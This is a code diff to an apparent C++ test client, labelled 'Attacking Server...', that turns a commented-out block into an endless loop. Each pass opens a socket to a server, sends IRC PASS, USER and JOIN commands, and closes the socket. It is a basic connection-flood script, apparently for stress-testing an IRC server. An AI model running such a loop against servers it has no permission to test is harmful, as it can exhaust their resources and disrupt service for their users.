@@ -29,7 +29,7 @@ int main(int ac, char **av) {
             return 1;
         }
         std::cout << "Attacking Server...\n";
-        // while (1) {
+        while (1) {
 
             socket_fd = socket(hints.ai_family, hints.ai_socktype, hints.ai_protocol);
                 if (socket_fd == -1) {
@@ -38,9 +38,11 @@ int main(int ac, char **av) {
             }
 
             connect(socket_fd, res->ai_addr, res->ai_addrlen);
-            //send(socket_fd, "QUIT: zebi\r\n", 12, 0);
-            //close(socket_fd);
-        // }
+            send(socket_fd, "PASS 1234\r\n", 11, 0);
+			send(socket_fd, "USER\r\n", 6, 0);
+			send(socket_fd, "JOIN #general\r\n", 15, 0);
+            close(socket_fd);
+        }
         pause();
     } 
     else {
